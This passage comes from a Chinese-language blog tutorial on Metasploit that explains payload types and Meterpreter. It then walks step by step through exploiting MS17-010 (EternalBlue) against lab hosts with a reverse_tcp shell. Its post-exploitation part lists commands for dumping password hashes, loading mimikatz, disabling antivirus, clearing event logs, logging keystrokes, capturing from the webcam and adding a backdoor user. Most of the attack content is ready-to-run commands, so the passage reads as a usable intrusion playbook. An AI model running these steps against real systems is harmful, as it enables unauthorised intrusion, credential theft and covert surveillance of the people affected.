class="built_in">set</span>  RHOST  192.168.100.158    					    <span class="comment">#设置参数</span></span><br><span class="line">exploit / run     								    <span class="comment">#攻击</span></span><br></pre></td></tr></table></figure><hr><h3 id="MSF-中加载自定义的-exploit模块"><a href="#MSF-中加载自定义的-exploit模块" class="headerlink" title="MSF 中加载自定义的 exploit模块"></a><code>MSF</code> 中加载自定义的 <code>exploit模块</code></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501" title="CVE-2019-0708 远程桌面漏洞复现">参考CSDN-CVE-2019-0708 远程桌面漏洞复现</a></p><hr><h3 id="漏洞利用-exploit"><a href="#漏洞利用-exploit" class="headerlink" title="漏洞利用 (exploit)"></a>漏洞利用 (exploit)</h3><blockquote><p>漏洞利用 exploit，也就是我们常说的 exp<br>他就是对漏洞进行攻击的代码</p></blockquote><p>exploit 漏洞利用模块路径 (这里面有针对不同平台的 exploit)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br></pre></td></tr></table></figure><hr><h3 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷 (payload)"></a>攻击载荷 (payload)</h3><p><strong>Payload</strong></p><blockquote><p><code>Payload</code> 中包含攻击进入目标主机后需要在远程系统中运行的恶意代码<br>而在 <code>Metasploit</code> 中 <code>Payload</code> 是一种特殊模块<br>它们能够以漏洞利用模块运行<br>并能够利用目标系统中的安全漏洞实施攻击<br>简而言之，这种漏洞利用模块可以访问目标系统<br>而其中的代码定义了 <code>Payload</code> 在目标系统中的行为</p></blockquote><p><strong>Shellcode</strong></p><blockquote><p><code>Shellcode</code> 是 <code>payload</code> 中的精髓部分<br>在渗透攻击时作为攻击载荷运行的一组机器指令<br><code>Shellcode</code> 通常用汇编语言编写<br>在大多数情况下，目标系统执行了 <code>shellcode</code>这一组指令之后<br>才会提供一个命令行 <code>shell</code></p></blockquote><h4 id="payload-模块路径"><a href="#payload-模块路径" class="headerlink" title="payload 模块路径"></a>payload 模块路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/payloads</span><br></pre></td></tr></table></figure><h4 id="Metasploit-中的-Payload-模块主要有以下三种类型"><a href="#Metasploit-中的-Payload-模块主要有以下三种类型" class="headerlink" title="Metasploit 中的 Payload 模块主要有以下三种类型"></a>Metasploit 中的 Payload 模块主要有以下三种类型</h4><p><strong>Single</strong>：</p><blockquote><p>是一种完全独立的 <code>Payload</code>，而且使用起来就像运行 <code>calc.exe</code> 一样简单<br>例如添加一个系统用户或删除一份文件。由于 <code>Single Payload</code> 是完全独立的，因此它们有可能会被类似 <code>netcat</code> 这样的非 <code>metasploit</code> 处理工具所捕捉到</p></blockquote><p><strong>Stager</strong>：</p><blockquote><p>这种 <code>Payload 负责建立目标用户与攻击者之间的网络连接</code>，并下载额外的组件或应用程序<br>一种常见的 <code>Stager Payload</code> 就是 <code>reverse_tcp</code>，它<code>可以让目标系统与攻击者建立一条 tcp 连接</code>，让目标系统主动连接我们的端口 (反向连接)<br>另一种常见的是 <code>bind_tcp</code>，它可以<code>让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)</code></p></blockquote><p><strong>Stage</strong>：</p><blockquote><p>是 <code>Stager Payload</code> 下的一种 <code>Payload组件</code><br>这种 Payload 可以提供更加高级的功能，而且没有大小限制</p></blockquote><p>在 Metasploit 中，我们可以通过 Payload 的名称和使用格式来推断它的类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Single Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;single&gt;  如：windows/powershell_bind_tcp</span><br><span class="line"><span class="comment">#Stager/Stage Payload的格式为：</span></span><br><span class="line">&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt;  如：windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ul><li>当我们在 Metasploit 中执行 show payloads 命令之后，它会给我们显示一个可使用的 Payload 列表</li></ul><blockquote><p>在这个列表中，像 <code>windows/powershell_bind_tcp</code> 就是一个 <code>Single Payload</code>，它不包含 <code>Stage Payload</code><br>而 <code>windows/meterpreter/reverse_tcp</code> 则由一个 <code>Stage Payload (meterpreter)</code>和 一个 <code>Stager Payload (reverse_tcp)</code> 组成</p></blockquote><p>Stager 中几种常见的 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp       <span class="comment">#正向连接</span></span><br><span class="line">windows/meterpreter/reverse_tcp    <span class="comment">#反向连接，常用</span></span><br><span class="line">windows/meterpreter/reverse_http   <span class="comment">#通过监听80端口反向连接</span></span><br><span class="line">windows/meterpreter/reverse_https  <span class="comment">#通过监听443端口反向连接</span></span><br></pre></td></tr></table></figure><ul><li><p>正向连接使用场景</p><blockquote><p>我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了<br>但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了 80 端口<br>那么，我们就只能设置正向连接 80 端口了，这里很有可能失败，因为 80 端口上的流量太多了</p></blockquote></li><li><p>反向连接使用场景</p><blockquote><p>我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了<br>如果是这样的情况，建议使用反向连接<br>因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量</p></blockquote></li><li><p>反向连接80和443端口使用场景</p><blockquote><p>被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格<br>就连被攻击机访问外部网络的流量也进行了严格的限制<br>只允许被攻击机的 80 端口或 443 端口与外部通信</p></blockquote></li></ul><hr><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><blockquote><p><code>Meterpreter</code> 属于 <code>stage payload</code><br>在 <code>Metasploit Framework</code> 中，<code>Meterpreter</code> 是一种<code>后渗透工具</code><br>它属于一种在运行过程中可通过网络进行功能扩展的<code>动态可扩展型 Payload</code><br>这种工具是基于 <code>内存 DLL 注入</code> 理念实现的<br>它能够通过创建一个<code>新进程并调用注入的 DLL</code> 来让<code>目标系统运行注入的 DLL文件</code></p></blockquote><h4 id="Meterpreter-是如何工作的？"><a href="#Meterpreter-是如何工作的？" class="headerlink" title="Meterpreter 是如何工作的？"></a>Meterpreter 是如何工作的？</h4><blockquote><p>首先目标先要执行初始的溢出漏洞会话连接，可能是 <code>bind 正向连接</code>，或者<code>反弹 reverse 连接</code><br>反射连接的时候<code>加载 dll 链接文件</code>，同时<code>后台悄悄处理 dll 文件</code><br>其次 <code>Meterpreter</code> 核心代码初始化，通过 <code>socket 套接字</code>建立一个 <code>TLS/1.0</code> 加密隧道并发送 <code>GET 请求</code> 给 <code>Metasploit 服务端</code><br><code>Metasploit 服务端</code>收到这个 <code>GET</code> 请求后就配置相应客户端<br>最后，<code>Meterpreter</code> 加载扩展，所有的扩展被加载都通过 <code>TLS/1.0</code> 进行数据传输</p></blockquote><h4 id="Meterpreter-的特点"><a href="#Meterpreter-的特点" class="headerlink" title="Meterpreter 的特点"></a>Meterpreter 的特点</h4><ul><li><code>Meterpreter</code> 完全驻留在内存，没有写入到磁盘。</li><li><code>Meterpreter</code> 注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。</li><li>默认情况下， <code>Meterpreter</code> 的通信是加密的，所以很安全。</li><li>扩展性，许多新的特征模块可以被加载。</li></ul><p>我们在设置 <code>payloads</code> 时，可以将 <code>payloads</code> 设置为：<code>windows/meterpreter/reverse_tcp</code><br>然后获得了 <code>meterpreter&gt;</code> 之后我们就可以干很多事了</p><hr><h3 id="MS17-010-永恒之蓝"><a href="#MS17-010-永恒之蓝" class="headerlink" title="MS17_010 (永恒之蓝)"></a>MS17_010 (永恒之蓝)</h3><blockquote><p>我们现在模拟使用 MS17_010 漏洞攻击<br>这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞</p></blockquote><h4 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h4><ol><li><p>在 kali 命令行里面输入命令 msfconsole，进入 msf 框架中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  <span class="comment">#输入命令进入msf渗透框架中</span></span><br></pre></td></tr></table></figure></li><li><p>搜索 MS17_010 漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010  <span class="comment">#利用search命令，搜索漏洞相关利用模块</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="利用-Auxiliary辅助探测模块-对漏洞进行探测"><a href="#利用-Auxiliary辅助探测模块-对漏洞进行探测" class="headerlink" title="利用 Auxiliary辅助探测模块 对漏洞进行探测"></a>利用 <code>Auxiliary辅助探测模块</code> 对漏洞进行探测</h4><p><strong>Auxiliary辅助探测模块</strong></p><blockquote><p>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试</p></blockquote><ol><li><p>使用 smb_ms17_010 漏洞探测模块对 smb_ms17_010 漏洞进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure></li><li><p>查看这个模块需要配置的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options  <span class="comment">#查看这个模块需要配置的信息</span></span><br></pre></td></tr></table></figure></li><li><p>设置要探测的远程目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.100.100-192.168.100.190</span><br></pre></td></tr></table></figure></li><li><p>对上面设置的 ip 范围内的主机进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol><h4 id="使用-Exploit漏洞利用模块-对漏洞进行利用"><a href="#使用-Exploit漏洞利用模块-对漏洞进行利用" class="headerlink" title="使用 Exploit漏洞利用模块 对漏洞进行利用"></a>使用 <code>Exploit漏洞利用模块</code> 对漏洞进行利用</h4><ol><li><p>选择漏洞攻击模块，对漏洞进行利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></li><li><p>查看这个漏洞的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure></li><li><p>查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets  </span><br></pre></td></tr></table></figure></li></ol><h4 id="Payload-攻击载荷模块"><a href="#Payload-攻击载荷模块" class="headerlink" title="Payload 攻击载荷模块"></a>Payload 攻击载荷模块</h4><blockquote><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码<br>成功渗透目标后，用于在目标系统上运行任意命令</p></blockquote><ol><li><p>查看攻击载荷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  payloads  <span class="comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span></span><br></pre></td></tr></table></figure></li><li><p>设置攻击载荷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看模块需要配置的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  options</span><br></pre></td></tr></table></figure></li><li><p>设置攻击载荷参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.100.158   <span class="comment">#设置RHOST，也就是要攻击主机的ip</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.100.132   <span class="comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span></span><br><span class="line"><span class="built_in">set</span> lport 6666              <span class="comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span></span><br></pre></td></tr></table></figure></li><li><p>进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h3><blockquote><p>运行了 <code>exploit</code> 命令之后<br>我们开启了一个 <code>reverse TCP</code> 监听器来监听本地的 <code>6666</code> 端口<br>即我(攻击者)的本地主机地址(LHOST)和端口号(LPORT)<br>运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现</p></blockquote><p>Meterpreter 的命令用法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line"><span class="built_in">bg</span>                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line"><span class="built_in">exit</span>                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line"><span class="built_in">help</span>                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line"><span class="built_in">read</span>                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line"><span class="built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="built_in">cat</span>                           将文件内容读到屏幕上</span><br><span class="line"><span class="built_in">cd</span>                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line"><span class="built_in">cp</span>                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line"><span class="built_in">dir</span>                           列出文件（<span class="built_in">ls</span> 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line"><span class="built_in">ls</span>                            列出文件</span><br><span class="line"><span class="built_in">mkdir</span>                         制作目录</span><br><span class="line"><span class="built_in">mv</span>                            将源移动到目标</span><br><span class="line"><span class="built_in">pwd</span>                           打印工作目录</span><br><span class="line"><span class="built_in">rm</span>                            删除指定文件</span><br><span class="line"><span class="built_in">rmdir</span>                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line"><span class="built_in">kill</span>                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line"><span class="built_in">suspend</span>                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br></pre></td></tr></table></figure><p>输入 <code>shell</code> 即可切换到目标主机的 <code>windows cmd_shell</code> 里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell         <span class="comment">#获取目标主机的cmd_shell权限</span></span><br><span class="line">chcp 65001    <span class="comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span></span><br></pre></td></tr></table></figure><p>要想从目标主机 <code>shell</code> 退出到 <code>meterpreter</code> ，只需输入：<code>exit</code></p><p>从 <code>meterpreter</code> 退出到 <code>MSF框架</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background   <span class="comment">#把我们获得的meterpreter会话挂载到后台运行</span></span><br></pre></td></tr></table></figure><p>查看前面获得的 meterpreter_shell 会话，最前面的数字是会话的 id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions  -l    <span class="comment">#查看获得的meterpreter_shell会话列表</span></span><br></pre></td></tr></table></figure><p>输入 sessions [id 号] 即可进入相应的 meterpreter_shell 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br></pre></td></tr></table></figure><p>输入 <code>shell</code> 即可进入 <code>cmd</code> 类型的控制<br>再输入 <code>powershell</code> ，即可进入 <code>powershell</code> 类型的控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sysinfo             									<span class="comment">#查看目标主机系统信息</span></span><br><span class="line">run scraper         									<span class="comment">#查看目标主机详细信息</span></span><br><span class="line">run hashdump        									<span class="comment">#导出密码的哈希</span></span><br><span class="line">load kiwi           									<span class="comment">#加载mimikatz</span></span><br><span class="line">ps                  									<span class="comment">#查看目标主机进程信息</span></span><br><span class="line"><span class="built_in">pwd</span>                		 								<span class="comment">#查看目标当前目录(windows)</span></span><br><span class="line">getlwd              									<span class="comment">#查看目标当前目录(Linux)</span></span><br><span class="line">search -f *.jsp -d e:\                					<span class="comment">#搜索E盘中所有以.jsp为后缀的文件</span></span><br><span class="line">download  e:\test.txt  /root          					<span class="comment">#将目标机的e:\test.txt文件下载到/root目录下</span></span><br><span class="line">upload    /root/test.txt d:\<span class="built_in">test</span>      					<span class="comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span></span><br><span class="line">getpid             										<span class="comment">#查看当前Meterpreter Shell的进程PID</span></span><br><span class="line">migrate 1384        									<span class="comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span></span><br><span class="line">idletime           		 								<span class="comment">#查看主机运行时间</span></span><br><span class="line">getuid              									<span class="comment">#查看获取的当前权限</span></span><br><span class="line">getsystem           									<span class="comment">#提权,获得的当前用户是administrator才能成功</span></span><br><span class="line">run  killav        			 							<span class="comment">#关闭杀毒软件</span></span><br><span class="line">screenshot          									<span class="comment">#截图</span></span><br><span class="line">webcam_list         									<span class="comment">#查看目标主机的摄像头</span></span><br><span class="line">webcam_snap         									<span class="comment">#拍照</span></span><br><span class="line">webcam_stream       									<span class="comment">#开视频</span></span><br><span class="line">execute 参数 -f 可执行文件   							    <span class="comment">#执行可执行程序</span></span><br><span class="line">run getgui -u test1 -p Abc123456    					<span class="comment">#创建test1用户，密码为Abc123456</span></span><br><span class="line">run getgui -e                							<span 